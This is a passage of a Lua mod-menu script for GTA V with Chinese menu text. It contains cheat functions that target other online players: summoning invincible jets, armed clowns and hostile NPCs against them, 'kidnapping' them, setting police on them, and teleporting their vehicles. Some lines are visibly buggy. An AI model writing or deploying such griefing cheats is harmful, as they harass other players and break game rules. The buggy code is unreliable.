            ENTITY.SET_ENTITY_HEADING(towtruck, hdg)
            PED.SET_PED_INTO_VEHICLE(tower, towtruck, -1)
            request_control_of_entity(last_veh)
            VEHICLE.ATTACH_VEHICLE_TO_TOW_TRUCK(towtruck, last_veh, false, 0, 0, 0)
            TASK.TASK_VEHICLE_DRIVE_TO_COORD(tower, towtruck, math.random(1000), math.random(1000), math.random(100), 100, 1, ENTITY.GET_ENTITY_MODEL(last_veh), 4, 5, 0)
        end
    end

    function dispatch_mariachi(target)
        mariachi_thr = util.create_thread(function()
            local men = {}
            local player_ped
            local pos_offsets = {-1.0, 0.0, 1.0}
            local p_hash = -927261102
            local pos
            request_model_load(p_hash)
            player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(target)
            for i=1, 3 do
                local spawn_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, pos_offsets[i], 1.0, 0.0)
                local ped = entities.create_ped(1, p_hash, spawn_pos, 0.0)
                local flag = entities.create_object(util.joaat("prop_flag_mexico"), spawn_pos, 0)
                ENTITY.SET_ENTITY_HEADING(ped, ENTITY.GET_ENTITY_HEADING(player_ped)+180)
                ENTITY.ATTACH_ENTITY_TO_ENTITY(flag, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, true, true, false, true, 1, true)
                ENTITY.SET_ENTITY_COMPLETELY_DISABLE_COLLISION(ped, true, false)
                TASK.TASK_START_SCENARIO_IN_PLACE(ped, "WORLD_HUMAN_MUSICIAN", 0, false)
                PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(ped, true)
                PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
                PED.SET_PED_CAN_RAGDOLL(ped, false)
                ENTITY.SET_ENTITY_INVINCIBLE(ped, true)
                men[#men + 1] = ped
            end
        end)
    end

custom_hooker_options = {"克隆玩家", "莱斯特", "特雷西", "贝克女士", "性爱女孩"}
function sendsexgirl(pid, index, value)
    local hooker
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), -5.0, 0.0, 0.0)
    pluto_switch index do
        case 1:
            hooker = PED.CLONE_PED(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), true, false, true)
            break
        case 2:
            request_model_load(util.joaat('cs_lestercrest'))
            hooker = entities.create_ped(28, util.joaat('cs_lestercrest'), c, math.random(270))
            break
        case 3:
            request_model_load(util.joaat('cs_tracydisanto'))
            hooker = entities.create_ped(28, util.joaat('cs_tracydisanto'), c, math.random(270))
            break
        case 4:
            request_model_load(util.joaat('csb_agatha'))
            hooker = entities.create_ped(28, util.joaat('csb_agatha'), c, math.random(270))
            break
        case 5:
            request_model_load(util.joaat('a_f_y_topless_01'))
            hooker = entities.create_ped(28, util.joaat('a_f_y_topless_01'), c, math.random(270))
            PED.SET_PED_COMPONENT_VARIATION(hooker, 8, 1, 1, 1)
            break
        
    end
    local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), -5.0, 0.0, 0.0)
    ENTITY.SET_ENTITY_COORDS(hooker, c.x, c.y, c.z)
    TASK.TASK_START_SCENARIO_IN_PLACE(hooker, "WORLD_HUMAN_PROSTITUTE_HIGH_CLASS", 0, false)
end

kidnap_types = {"卡车", "直升机"}
function kidnapplayer(pid, index,value)
    local p_hash = util.joaat("s_m_y_factory_01")
        local v_hash = 0
        pluto_switch index do 
            case 1:
                v_hash = util.joaat("boxville3")
                break 
            case 2:
                v_hash = util.joaat("cargobob")
                break
        end
        local user_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        request_model_load(v_hash)
        request_model_load(p_hash)
        local c = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(user_ped, 0.0, 2.0, 0.0)
        local truck = entities.create_vehicle(v_hash, c, ENTITY.GET_ENTITY_HEADING(user_ped))
        local driver = entities.create_ped(5, p_hash, c, 0)
        PED.SET_PED_INTO_VEHICLE(driver, truck, -1)
        PED.SET_PED_FLEE_ATTRIBUTES(driver, 0, false)
        ENTITY.SET_ENTITY_INVINCIBLE(driver, true)
        ENTITY.SET_ENTITY_INVINCIBLE(truck, true)
        request_model_load(prop_hash)
        PED.SET_PED_CAN_BE_DRAGGED_OUT(driver, false)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(driver, true)
        util.yield(2000)
        if index == 1 then
            TASK.TASK_VEHICLE_DRIVE_TO_COORD(driver, truck, math.random(1000), math.random(1000), math.random(100), 100, 1, ENTITY.GET_ENTITY_MODEL(truck), 786996, 5, 0)
        elseif index == 2 then 
            TASK.TASK_HELI_MISSION(driver, truck, 0, 0, math.random(1000), math.random(1000), 1500, 4, 200.0, 0.0, 0, 100, 1000, 0.0, 16)
        end
    end

function meowbmob(pid)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(target_ped, false)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    hash = util.joaat("a_c_cat_01")
    request_model_load(hash)
    for i=1, 30 do
        local cat = entities.create_ped(28, hash, coords, math.random(0, 270))
        local rand_x = math.random(-10, 10)*5
        local rand_y = math.random(-10, 10)*5
        local rand_z = math.random(-10, 10)*5
        ENTITY.SET_ENTITY_INVINCIBLE(cat, true)
        ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(cat, 1, rand_x, rand_y, rand_z, true, false, true, true)
        AUDIO.PLAY_PAIN(cat, 7, 0)
    end
end

function tellpolicetocatch(pid)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local all_peds = entities.get_all_peds_as_handles()
    for k, ped in pairs(all_peds) do
        if not is_ped_player(ped) then
            request_control_of_entity(ped)
            PED.SET_PED_AS_COP(ped, true)
            PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
            PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
            WEAPON.GIVE_WEAPON_TO_PED(ped, 453432689, 0, false, true)
            TASK.TASK_ARREST_PED(ped, player_ped)
        end
    end
end

fill_with_options = {"随机PED", "警察", "脱衣舞娘", "拉马", "莱斯特"}
function npcfillthecar(pid, index,value)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    if PED.IS_PED_IN_ANY_VEHICLE(target_ped, true) then
        local veh = PED.GET_VEHICLE_PED_IS_IN(target_ped, false)
        local success = true
        for i = 0, VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(veh)) do
            local ped
            if VEHICLE.IS_VEHICLE_SEAT_FREE(veh, i) then
                local c = ENTITY.GET_ENTITY_COORDS(veh)
                pluto_switch index do
                    case 1:
                        ped = PED.CREATE_RANDOM_PED(c.x, c.y, c.z)
                        break
                    case 2:
                        local cops = {'s_f_y_cop_01', 's_m_m_snowcop_0', 's_m_y_hwaycop_01', 'csb_cop', 's_m_y_cop_01'}
                        local pick = cops[math.random(1, #cops)]
                        request_model_load(util.joaat(pick))
                        ped = entities.create_ped(6, util.joaat(pick), c, 0)
                        PED.SET_PED_AS_COP(ped, true)
                        WEAPON.GIVE_WEAPON_TO_PED(ped, util.joaat("weapon_pistol"), 1000, false, false)
                        break
                    case 3:
                        local strippers = {'csb_stripper_01', 'csb_stripper_02', 's_f_y_stripper_01', 's_f_y_stripper_02', 's_f_y_stripperlite'}
                        local pick = strippers[math.random(1, #strippers)]
                        request_model_load(util.joaat(pick))
                        ped = entities.create_ped(6, util.joaat(pick), c, 0)
                        break
                    case 4:
                        request_model_load(util.joaat('ig_lamardavis'))
                        ped = entities.create_ped(6, util.joaat('ig_lamardavis'), c, 0)
                        break 
                    case 5:
                        request_model_load(util.joaat('ig_lestercrest'))
                        ped = entities.create_ped(6, util.joaat('ig_lestercrest'), c, 0)
                        break 
                end
                PED.SET_PED_INTO_VEHICLE(ped, veh, i)
                PED.SET_PED_COMBAT_ATTRIBUTES(ped, 5, true)
                PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
                PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
                PED.SET_PED_CAN_BE_DRAGGED_OUT(ped, false)
                PED.SET_PED_CAN_BE_KNOCKED_OFF_VEHICLE(ped, false)
            end
        end
    end
end

function jetstokill(pid)
    local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(target_ped, 1.0, 0.0, 500.0)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    local hash = util.joaat("lazer")
    request_model_load(hash)
    request_model_load(-163714847)
    for i=1, num_attackers do
        coords.x = coords.x + i*2
        coords.y = coords.y + i*2
        local jet = entities.create_vehicle(hash, coords, 0.0)
        VEHICLE.CONTROL_LANDING_GEAR(jet, 3)
        VEHICLE.SET_HELI_BLADES_FULL_SPEED(jet)
        VEHICLE.SET_VEHICLE_FORWARD_SPEED(jet, VEHICLE.GET_VEHICLE_ESTIMATED_MAX_SPEED(jet))
        if godmodeatk then
            ENTITY.SET_ENTITY_INVINCIBLE(jet, true)
        end
        local pilot = entities.create_ped(28, -163714847, coords, 30.0)
        PED.SET_PED_COMBAT_ATTRIBUTES(pilot, 5, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(pilot, 46, true)
        PED.SET_PED_INTO_VEHICLE(pilot, jet, -1)
        TASK.TASK_PLANE_MISSION(pilot, jet, 0, target_ped, 0, 0, 0, 6, 0.0, 0, 0.0, 50.0, 40.0)
        TASK.TASK_COMBAT_PED(pilot, target_ped, 0, 16)
        PED.SET_PED_ACCURACY(pilot, 100.0)
        PED.SET_PED_COMBAT_ABILITY(pilot, 2)
    end
end

function sendbritsh(pid)
    local hash = 0x9C9EFFD8
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    request_model_load(hash)
    request_model_load(util.joaat("prop_flag_uk"))
    local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, 0.0, 2.0, 0.0)
    coords.x = coords['x']
    coords.y = coords['y']
    coords.z = coords['z']
    for i=1, 5 do
        coords.x = coords['x']
        coords.y = coords['y']
        coords.z = coords['z']
        local ped = entities.create_ped(28, hash, coords, 30.0)
        local obj = OBJECT.CREATE_OBJECT_NO_OFFSET(util.joaat("prop_flag_uk"), coords['x'], coords['y'], coords['z'], true, false, false)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(obj, ped, 0, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
        PED.SET_PED_AS_ENEMY(ped, true)
        PED.SET_PED_FLEE_ATTRIBUTES(ped, 0, false)
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)
        WEAPON.GIVE_WEAPON_TO_PED(ped, -1834847097, 0, false, true)
        TASK.TASK_COMBAT_PED(ped, player_ped, 0, 16)
    end
end

function clownattck(pid)
    local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local clown_hash = 71929310
    request_model_load(clown_hash)
    local van_hash = util.joaat("speedo2")
    request_model_load(van_hash)
    local coords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
    local spawn_pos = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(player_ped, 0.0, -10.0, 0.0)
    spawn_pos.x = spawn_pos['x']
    spawn_pos.y = spawn_pos['y']
    spawn_pos.z = spawn_pos['z']
    local van = entities.create_vehicle(van_hash, spawn_pos, ENTITY.GET_ENTITY_HEADING(player_ped))
    if godmodeatk then
        ENTITY.SET_ENTITY_INVINCIBLE(van, true)
    end
    for i=-1, VEHICLE.GET_VEHICLE_MAX_NUMBER_OF_PASSENGERS(van) - 1 do
        local clown = entities.create_ped(1, clown_hash, spawn_pos, 0.0)
        PED.SET_PED_INTO_VEHICLE(clown, van, i)
        if i % 2 == 0 then
            WEAPON.GIVE_WEAPON_TO_PED(clown, -1810795771, 1000, false, true)
        else
            WEAPON.GIVE_WEAPON_TO_PED(clown, 584646201, 1000, false, true)
        end
        PED.SET_PED_COMBAT_ATTRIBUTES(clown, 5, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(clown, 46, true)
        if i == -1 then
            TASK.TASK_VEHICLE_CHASE(clown, player_ped)
        else
            TASK.TASK_COMBAT_PED(clown, player_ped, 0, 16)
        end
        if godmodeatk then
            ENTITY.SET_ENTITY_INVINCIBLE(clown, true)
        end
    end
end

local function SF_ff9()
    local scaleform = require('lib.baibai1lib.lib.ScaleformLib')
    local sf = scaleform('instructional_buttons')
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(6)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(7)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(8)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(9)
    memory.write_int(memory.script_global(1645739+1121), 1)
    sf.CLEAR_ALL()
    sf.TOGGLE_MOUSE_BUTTONS(false)
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 86, true), '爆炸 或 推开按')
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

local charger = {charg = util.joaat('dukes2'), emp = util.joaat('hei_prop_heist_emp')}
local function Ccreate(pCoor, pedSi)
    if ENTITY.DOES_ENTITY_EXIST(charger.charg) ==false then
        FFchar = VEHICLE.CREATE_VEHICLE(charger.charg, pCoor.x, pCoor.y, pCoor.z, 0, true, true, false)
        PED.SET_PED_INTO_VEHICLE(pedSi, FFchar, -1)
        VEHICLE.SET_VEHICLE_COLOURS(FFchar, 118, 0)
        for M=0, 49 do
            local modn = VEHICLE.GET_NUM_VEHICLE_MODS(FFchar, M)
            VEHICLE.SET_VEHICLE_MOD(FFchar, M, modn -1, false)
            VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(FFchar, 'MOPAR')
            VEHICLE.GET_VEHICLE_MOD_KIT(FFchar, 0)
            VEHICLE.SET_VEHICLE_MOD_KIT(FFchar, 0)
            VEHICLE.SET_VEHICLE_MOD(FFchar, 14, 0)
            VEHICLE.TOGGLE_VEHICLE_MOD(FFchar, 22, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(FFchar, 18, true)
            VEHICLE.TOGGLE_VEHICLE_MOD(FFchar, 20, true)
            VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(FFchar, 0, 0, 0)
            VEHICLE.SET_VEHICLE_WHEEL_TYPE(FFchar, 7)
            VEHICLE.SET_VEHICLE_MOD(FFchar, 23, 26)
            VEHICLE.SET_VEHICLE_MAX_SPEED(FFchar, 100)
            VEHICLE.MODIFY_VEHICLE_TOP_SPEED(FFchar, 40)
            VEHICLE.SET_VEHICLE_BURNOUT(FFchar, false)
        end

        util.yield(150)

       local ccoor = ENTITY.GET_ENTITY_COORDS(FFchar)

        if  ENTITY.DOES_ENTITY_EXIST(charger.emp) ==false
        then Empa = OBJECT.CREATE_OBJECT(charger.emp, ccoor.x, ccoor.y -1, ccoor.z -1, true, true, true)
            ENTITY.ATTACH_ENTITY_TO_ENTITY(Empa, FFchar, 0, 0.0, -2.0, 0.5, 0.0, 0.0, 0.0, false, true, false, false, 0, true)
            local CV = CAM.GET_GAMEPLAY_CAM_RELATIVE_HEADING()
            ENTITY.SET_ENTITY_HEADING(FFchar, CV)
            util.yield()
        end

    local magtf = {true, false}
    local maglist = {'推开', '爆炸'}
    local magval = {mag_v = true}
    function Magout()
        if  PAD.IS_CONTROL_PRESSED(0, 86) then
        local car = ENTITY.GET_ENTITY_COORDS(players.user_ped())

        FIRE.ADD_EXPLOSION(car.x, car.y, car.z, 81, 5000.0, false, true, 0.0, magval.mag_v)
        end
    util.yield()
end

    Mag_int = menu.list_action(ff9car, '电磁脉冲样式', {'Magint'}, '更改电磁脉冲样式为推开或炸毁', maglist, function(magint)
        magval.mag_v = magtf[magint]
        end)


      util.create_tick_handler(function ()
            if PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar, false) ==true then
            VEHICLE.SET_VEHICLE_DIRT_LEVEL(FFchar, 0)
            ENTITY.SET_ENTITY_INVINCIBLE(FFchar, true)
            VEHICLE.SET_VEHICLE_CAN_BE_VISIBLY_DAMAGED(FFchar, false)
            SF_ff9()
            end
        end)
        else
    end
end

function spawnspecialcar()
    Streament(charger.charg)
    Streament(charger.emp)
    local pedSi = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local pCoor = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local pH = ENTITY.GET_ENTITY_HEADING(pCoor)

        if players.is_in_interior(players.user()) ==true then
            if set.alert then
                util.toast('不要在室内生成道奇战马')
            end
            menu.set_value(Spawn, false)
            return
        end

    if PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar, true) ==false and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==true then
        local curcar = entities.get_user_vehicle_as_handle()
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(curcar)
        entities.delete_by_handle(curcar)
        if set.alert then
            util.toast('去他妈的上一辆车,已为您更换新的')
        end
        Ccreate(pCoor, pedSi)

        elseif PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar, true) ==true then
            Magout()
        elseif PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==false then
                Ccreate(pCoor, pedSi)
                 if set.alert then
                    util.toast('道奇战马已生成')
                 end
        end

if PED.IS_PED_GETTING_INTO_A_VEHICLE(players.user_ped()) ==false and PED.IS_PED_IN_VEHICLE(players.user_ped(), FFchar , false) ==false
            then
                if set.alert then
                    util.toast('玩家已离开道奇战马并已被删除')
                end
        ---@diagnostic disable-next-line: param-type-mismatch
              menu.set_value(Spawn, false)
              ENTITY.SET_ENTITY_AS_MISSION_ENTITY(FFchar)
              entities.delete_by_handle(FFchar)
              ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Empa)
              entities.delete_by_handle(Empa)
              menu.delete(Mag_int)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(charger.charg)
            STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(charger.emp)

              util.stop_thread()

            end
        end

function SFlsd()
    local scaleform = require('lib.baibai1lib.lib.ScaleformLib')
    local sf = scaleform('instructional_buttons')
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(6)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(7)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(8)
    HUD.HIDE_HUD_COMPONENT_THIS_FRAME(9)
---@diagnostic disable-next-line: param-type-mismatch
    memory.write_int(memory.script_global(1645739+1121), 1)
    sf.CLEAR_ALL()
    sf.TOGGLE_MOUSE_BUTTONS(false)
    sf.SET_DATA_SLOT(0,PAD.GET_CONTROL_INSTRUCTIONAL_BUTTONS_STRING(0, 86, true), '镭射')
    sf.DRAW_INSTRUCTIONAL_BUTTONS()
    sf:draw_fullscreen()
end

function Vmod(vmod, plate)
    VEHICLE.SET_VEHICLE_FIXED(vmod)
    for M=0, 49 do
        local modn =  VEHICLE.GET_NUM_VEHICLE_MODS(vmod, M)
        VEHICLE.SET_VEHICLE_MOD(vmod, M, modn -1, false)
        VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vmod, plate)
        VEHICLE.GET_VEHICLE_MOD_KIT(vmod, 0)
        VEHICLE.SET_VEHICLE_MOD_KIT(vmod, 0)
        VEHICLE.SET_VEHICLE_MOD(vmod, 14, 0)
        VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 22, true)
        VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 18, true)
        VEHICLE.TOGGLE_VEHICLE_MOD(vmod, 20, true)
        VEHICLE.SET_VEHICLE_TYRE_SMOKE_COLOR(vmod, 0, 0, 0)
        VEHICLE.SET_VEHICLE_MAX_SPEED(vmod, 100)
        VEHICLE.MODIFY_VEHICLE_TOP_SPEED(vmod, 40)
        VEHICLE.SET_VEHICLE_BURNOUT(vmod, false)
    end
end

local function SDcreate(pCoor, pedSi)
    Lsdcar = VEHICLE.CREATE_VEHICLE(lsd.hash, pCoor.x, pCoor.y, pCoor.z, 0, true, true, false)
    PED.SET_PED_INTO_VEHICLE(pedSi, Lsdcar, -1)
    Vmod(Lsdcar, '镭射')
   local CV = CAM.GET_GAMEPLAY_CAM_RELATIVE_HEADING()
   ENTITY.SET_ENTITY_HEADING(Lsdcar, CV)
 
Lsd_w = menu.list_select(sdroot, '魔幻战马武器', {'lsdweap'},'更改魔幻激光战马的武器', lsdweap, 1, function(vweap)
    lsd.weap = lsdh[vweap]
end)
 
util.create_tick_handler(function ()
        if PED.IS_PED_IN_VEHICLE(players.user_ped(), Lsdcar, false) ==true then
        VEHICLE.SET_VEHICLE_DIRT_LEVEL(Lsdcar, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(Lsdcar, true)
        VEHICLE.SET_VEHICLE_CAN_BE_VISIBLY_DAMAGED(Lsdcar, false)
        SFlsd()
        end
    end)
end

local shoot_from_vehicle_Lazer_Space_Car = function (vehicle, damage, weaponHash, ownerPed, isAudible, isVisible, speed, target, position)
    local min, max = v3.new(), v3.new()
    local offset
    MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(vehicle), min, max)
    if position == 0 then
        offset = v3.new(min.x + 0.3, max.y + 0.25, 0.5)
    elseif position == 1 then
        offset = v3.new(min.x + 0.3, min.y + 4, 0.5)
    elseif position == 2 then
        offset = v3.new(max.x - 0.3, max.y + 0.25, 0.5)
    elseif position == 3 then
        offset = v3.new(max.x - 0.3, min.y + 4, 0.5)
    else
        error("got unexpected position")offset = v3.new(min.x + 0.25, max.y, 0.5)
    end
    local a = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(vehicle, offset.x, offset.y - 3.15, offset.z + 1.05)
    local direction = ENTITY.GET_ENTITY_ROTATION(vehicle, 2):toDir()
    if get_vehicle_cam_relative_heading(vehicle) > 95.0 then
        direction:mul(-1)
    end
    local b = v3.new(direction)
    b:mul(300.0); b:add(a)

    MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS_IGNORE_ENTITY_NEW(
        a.x, a.y, a.z,
        b.x, b.y, b.z - 15,
        damage,
        true,
        weaponHash,
        ownerPed,
        isAudible,
        not isVisible,
        speed,
        vehicle,
        false, false, target, false, 0, 0, 0
    )
end

function Lazer_Space_Car()
    Streament(lsd.hash)
    local pedSi = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())
    local pCoor = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    local pH = ENTITY.GET_ENTITY_HEADING(pCoor)

        if players.is_in_interior(players.user()) ==true then
            if set.alert then
                util.toast('魔幻激光战马不会在内部生成')
            end
            menu.set_value(SDspawn, false)
            return
        end
    if PED.IS_PED_IN_VEHICLE(players.user_ped(), Lsdcar, true) ==false and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==true then
        local curcar = entities.get_user_vehicle_as_handle()
        ENTITY.SET_ENTITY_AS_MISSION_ENTITY(curcar)
        entities.delete_by_handle(curcar)
        if set.alert then
            util.toast('已为您更换新的战马')
        end
        for i = 1, 1 do
            SDcreate(pCoor, pedSi)
        end

        elseif PED.IS_PED_IN_VEHICLE(players.user_ped(), Lsdcar, true) ==true then
            local weap = util.joaat(lsd.weap)
            WEAPON.REQUEST_WEAPON_ASSET(weap)
        
            if not ENTITY.DOES_ENTITY_EXIST(Lsdcar) or not PAD.IS_CONTROL_PRESSED(0, 86)
            then
                return
            elseif get_vehicle_cam_relative_heading(Lsdcar) < 95.0 then
                shoot_from_vehicle_Lazer_Space_Car(Lsdcar, 200, weap, players.user_ped(), true, true, 2000.0, 0, 0)
                shoot_from_vehicle_Lazer_Space_Car(Lsdcar, 200, weap, players.user_ped(), true, true, 2000.0, 0, 2)
            else
                shoot_from_vehicle_Lazer_Space_Car(Lsdcar, 200, weap, players.user_ped(), true, true, 2000.0, 0, 1)
                shoot_from_vehicle_Lazer_Space_Car(Lsdcar, 200, weap, players.user_ped(), true, true, 2000.0, 0, 3)
            end


        elseif PED.IS_PED_IN_ANY_VEHICLE(players.user_ped()) ==false and not ENTITY.DOES_ENTITY_EXIST(Lsdcar) then
            SDcreate(pCoor, pedSi)
                 if set.alert then
                    util.toast('生成了魔幻激光战马')
                 end
        end

if PED.IS_PED_GETTING_INTO_A_VEHICLE(players.user_ped()) ==false and PED.IS_PED_IN_VEHICLE(players.user_ped(), Lsdcar , false) ==false
            then
                if set.alert then
                    util.toast('玩家已离开魔幻激光战马，它已被删除')
                end
              menu.set_value(SDspawn, false)
              STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(lsd.hash)
              ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Lsdcar)
              entities.delete_by_handle(Lsdcar)
              menu.delete(Lsd_w)
              util.stop_thread()
            end
        end




function forcecmsoncar()
    if PAD.IS_CONTROL_PRESSED(46, 46) then
        local target = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), math.random(-5, 5), -30.0, math.random(-5, 5))
        MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(target['x'], target['y'], target['z'], target['x'], target['y'], target['z'], 100.0, true, 1198879012, players.user_ped(), true, false, 100.0)
    end
end

tesla_ped = 0
function teslasummoncar()
    lastcar = PLAYER.GET_PLAYERS_LAST_VEHICLE()
    if lastcar ~= 0 then
        local plyr = PLAYER.PLAYER_PED_ID()
        local coords = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(plyr, 0.0, 5.0, 0.0)
        local phash = -67533719
        request_model_load(phash)
        tesla_ped = entities.create_ped(32, phash, coords, ENTITY.GET_ENTITY_HEADING(plyr))
        tesla_blip = HUD.ADD_BLIP_FOR_ENTITY(tesla_ped)
        HUD.SET_BLIP_COLOUR(tesla_blip, 7)
        ENTITY.SET_ENTITY_VISIBLE(tesla_ped, false, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(tesla_ped, true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(tesla_ped, true)
        PED.SET_PED_FLEE_ATTRIBUTES(tesla_ped, 0, false)
        VEHICLE.SET_VEHICLE_DOORS_LOCKED_FOR_ALL_PLAYERS(lastcar, true)
        PED.SET_PED_INTO_VEHICLE(tesla_ped, lastcar, -1)
        TASK.TASK_VEHICLE_DRIVE_TO_COORD_LONGRANGE(tesla_ped, lastcar, coords['x'], coords['y'], coords['z'], 300.0, 786996, 5)
    end
end

player_cur_car = 0
function carlshormspam()
    if player_cur_car ~= 0 and  PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then
        VEHICLE.SET_VEHICLE_MOD(player_cur_car, 14, math.random(0, 51), false)
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 86, 1.0)
        util.yield(50)
        PAD.SET_CONTROL_VALUE_NEXT_FRAME(2, 86, 0.0)
    end
end

function tm02fastshot()
    local player_veh = PED.GET_VEHICLE_PED_IS_USING(players.user_ped())
    if ENTITY.GET_ENTITY_MODEL(player_veh) == util.joaat("khanjali") then
        VEHICLE.SET_VEHICLE_MOD(player_veh, 10, math.random(-1, 0), false)
    else
        util.toast("请先驾驶TM-02 可汗贾利.")
        menu.trigger_command(rapid_khanjali, "off")
    end
end

function setcardirty(s)
    if player_cur_car ~= 0 then
        VEHICLE.SET_VEHICLE_DIRT_LEVEL(player_cur_car, s)
    end
end

function setstacky(s)
    if player_cur_car ~= 0 then
        old_veh = player_cur_car
        for i=1, s do
            local c = ENTITY.GET_ENTITY_COORDS(old_veh, false)
            local mdl = ENTITY.GET_ENTITY_MODEL(player_cur_car)
            local size = get_model_size(mdl)
            local r = ENTITY.GET_ENTITY_ROTATION(old_veh, 0)
            new_veh = entities.create_vehicle(mdl, players.get_position(players.user()), ENTITY.GET_ENTITY_HEADING(old_veh))
            ENTITY.ATTACH_ENTITY_TO_ENTITY(new_veh, old_veh, 0, 0.0, 0.0, size.z, 0.0, 0.0, 0.0, true, false, falsmy_e, false, 0, true)
            old_veh = new_veh
        end
    end
end

function setstackx(s)
    if player_cur_car ~= 0 then
        for i=1, s do
            main_veh = player_cur_car
            local c = ENTITY.GET_ENTITY_COORDS(main_veh, false)
            local mdl = ENTITY.GET_ENTITY_MODEL(main_veh)
            local size = get_model_size(mdl)
            local r = ENTITY.GET_ENTITY_ROTATION(main_veh, 0)
            left_new = entities.create_vehicle(mdl, players.get_position(players.user()), ENTITY.GET_ENTITY_HEADING(main_veh))
            ENTITY.ATTACH_ENTITY_TO_ENTITY(left_new, main_veh, 0, -size.x*i, 0.0, 0.0, 0.0, 0.0, 0.0, true, false, false, false, 0, true)
            right_new = entities.create_vehicle(mdl, players.get_position(players.user()), ENTITY.GET_ENTITY_HEADING(main_veh))
            ENTITY.ATTACH_ENTITY_TO_ENTITY(right_new, main_veh, 0, size.x*i, 0.0, 0.0, 0.0, 0.0, 0.0, true, false, false, false, 0, true)
        end
    end
end



function forceteleplace()
    menu.action(apforcedacts_root, "传送载具到航路点", {"tpavtoway"}, "这可能有效，也可能无效。如果这不起作用，它不是一个bug", function(on_click)
        local c = get_waypoint_coords()
        if c ~= nil then
            tp_all_player_cars_to_coords(c)
        end
    end)
    
    menu.action(apforcedacts_root, "传送载具到花园银行直升机停机坪", {"tpavtomaze"}, "如果这不起作用，它不是一个bug", function(on_click)
        local c = {}
        c.x = -75.261375
        c.y = -818.674
        c.z = 326.17517
